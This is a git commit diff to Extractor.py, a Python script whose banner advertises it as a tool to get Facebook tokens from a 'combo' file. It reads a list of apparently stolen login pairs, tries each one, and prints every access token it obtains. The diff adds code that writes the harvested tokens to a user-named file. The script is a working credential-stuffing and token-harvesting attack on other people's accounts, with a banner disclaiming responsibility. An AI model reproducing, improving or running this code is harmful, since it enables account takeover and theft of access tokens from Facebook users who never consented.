36f8ea857aebc7a7f8364dc18f0c6d0f318cbd7e
Ahmed Gad <34446175+xXBandoXx201@users.noreply.github.com>
2018-01-27 20:33:47 +0200

    Update Extractor.py
    add Save Token

--- Extractor.py
+++ Extractor.py
@@ -2,9 +2,11 @@
 #coding: utf-8
 #Code By : Gad
 import requests, json
+import os
 gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
 print(gad)
-combo = input('Enter Combo text File >>')
+file_save = input('Name Of File Save Toke >>') +'.txt'
+combo = input('Enter Combo text File >>')+'.txt'
 var = open(combo, 'r').readlines()
 for line in var:
 	combo = line.strip()
@@ -15,3 +17,6 @@ for line in var:
 	data = json.loads(content.decode("utf-8"))
 	if "session_key" in data:
                 print(data["access_token"])
+                the_file = open(file_save, 'w')
+                the_file.write(data["access_token"])
+                the_file.close()
